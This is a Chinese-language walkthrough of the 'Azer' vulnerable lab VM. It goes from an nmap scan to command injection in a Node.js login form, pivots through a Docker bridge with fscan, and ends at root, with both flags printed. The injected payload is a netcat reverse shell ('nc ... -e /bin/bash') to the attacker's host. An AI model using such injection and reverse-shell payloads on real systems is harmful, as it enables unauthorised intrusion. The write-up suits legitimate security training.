# Azer

:::note

[Linux VM] [Tested on VirtualBox and VMWare.] created by || tasiyanci

⏲️ Release Date // 2024-02-24

✔️ MD5 // 467223b33d6d8150a50b206401236da7

☠ Root // 2

💀 User // 10

📝Notes //
My birthday gift to community.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.120
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.120
Host is up (0.00044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: L&#214;SEV | L&#246;semili &#199;ocuklar Vakf\xC4\xB1
|_http-server-header: Apache/2.4.57 (Debian)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Login Page
```

## web 服务 Port-80

尝试进行目录扫描，但是未得到有价值信息

## web 服务 Port-3000

发现一个登录框，首先先简单尝试一下

```plaintext
a:a
Error executing bash script: Command failed: /home/azer/get.sh a a fatal: not a git repository (or any of the parent directories): .git
```

看到了疑似有脚本执行的部分，尝试执行命令注入执行反向 shell

```shell
nc 192.168.56.102 9999 -e /bin/bash : nc 192.168.56.102 9999 -e /bin/bash
```

成功得到回连的 shell

## User - azer

```shell
┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs -lp 9999
[15:35:38] Welcome to pwncat 🐈!
[15:45:41] received connection from 192.168.56.120:46168
[15:45:42] 192.168.56.120:46168: registered new host w/ db
(local) pwncat$ back
(remote) azer@azer:/home/azer$ whoami
azer
```

### flag - user

```plaintext
0d2856d69dc348b3af80a0eed67c7502
```

### 环境探测

尝试使用 `PEASS-ng` 执行自动化探测

发现以下高价值信息

```plaintext
                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
/usr/bin/docker
/usr/bin/runc
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No

╔══════════╣ Interfaces
default         0.0.0.0
loopback        127.0.0.0
link-local      169.254.0.0

br-333bcb432cd5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.1  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::42:77ff:fe23:89eb  prefixlen 64  scopeid 0x20<link>
        ether 02:42:77:23:89:eb  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 800 (800.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:b6:c5:b2:49  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.120  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::a00:27ff:fe04:638a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:04:63:8a  txqueuelen 1000  (Ethernet)
        RX packets 13943  bytes 1776686 (1.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24705  bytes 36362126 (34.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethf99cdf9: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::5437:acff:fec2:3a19  prefixlen 64  scopeid 0x20<link>
        ether 56:37:ac:c2:3a:19  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1680 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

可知靶机上存在 Docker 环境，但是由于权限限制，没有办法执行 `docker ps` 查看目前执行的容器信息

已知 docker 相关的网桥地址有

```plaintext
10.10.10.1
172.17.0.1
```

### 发现 Docker 容器服务

直接借助 [shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。](https://github.com/shadow1ng/fscan) 对 Docker 网桥进行扫描

```shell
(remote) azer@azer:/home/azer$ ./fscan -np -h 10.10.10.1/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.3
start infoscan
10.10.10.10:80 open
10.10.10.1:80 open
10.10.10.1:3000 open
```

可以发现除了本机以外，还有 `10.10.10.10:80` 这个服务存在

尝试访问

```shell
(remote) azer@azer:/home/azer$ curl 10.10.10.10:80
.:.AzerBulbul.:.
```

所得到的就是 root 用户的密码

## User - root

```shell
(remote) azer@azer:/home/azer$ su root
Password:
root@azer:/home/azer# whoami
root
```

### flag - root

```shell
root@azer:~# cat root.txt
b5d96aec2d5f1541c5e7910ccab527d8
```
